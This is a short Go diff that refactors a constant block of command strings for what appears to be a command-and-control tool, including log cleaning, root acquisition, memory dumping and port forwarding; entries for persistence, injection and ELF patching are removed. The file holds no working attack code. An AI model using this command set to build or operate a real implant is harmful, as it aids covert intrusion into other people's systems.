@@ -2,13 +2,12 @@ package def
 
 // C2Commands
 const (
-	C2CmdListDir        = "!ls_dir"
-	C2CmdCleanLog       = "!clean_log"
-	C2CmdGetRoot        = "!get_root"
-	C2CmdPersistence    = "!persistence"
-	C2CmdCustomModule   = "!custom_module"
-	C2CmdInject         = "!inject"
-	C2CmdUtils          = "!utils"
+	C2CmdListDir  = "!ls_dir"
+	C2CmdCleanLog = "!clean_log"
+	C2CmdGetRoot  = "!get_root"
+
+	C2CmdCustomModule = "!custom_module"
+
 	C2CmdDeletePortFwd  = "!delete_portfwd"
 	C2CmdPortFwd        = "!port_fwd"
 	C2CmdProxy          = "!proxy"
@@ -22,5 +21,4 @@ const (
 	C2CmdFileDownloader = "!file_downloader"
 	C2CmdMemDump        = "!mem_dump"
 	C2CmdScreenshot     = "!screenshot"
-	C2CmdElfPatch       = "!elf_patch"
 )
